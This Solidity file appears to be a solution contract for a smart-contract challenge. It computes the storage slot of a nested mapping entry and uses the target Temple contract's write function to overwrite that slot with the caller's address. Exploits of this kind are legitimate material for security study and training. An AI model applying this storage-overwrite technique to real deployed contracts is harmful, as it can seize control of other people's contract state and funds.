// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.22;

import {Temple} from "./Temple.sol";


contract WriteToGardens {

    function changeGardens(address _Temple) public {
        uint256 outerMappingKeySlot = uint256(keccak256(bytes.concat(abi.encode(20),abi.encode(2))));
        uint256 innerMappingKeySlot = uint256(keccak256(bytes.concat(abi.encode(22), abi.encode(outerMappingKeySlot))));
        Temple(_Temple).write(innerMappingKeySlot, bytes32(abi.encode(msg.sender)));
    }

}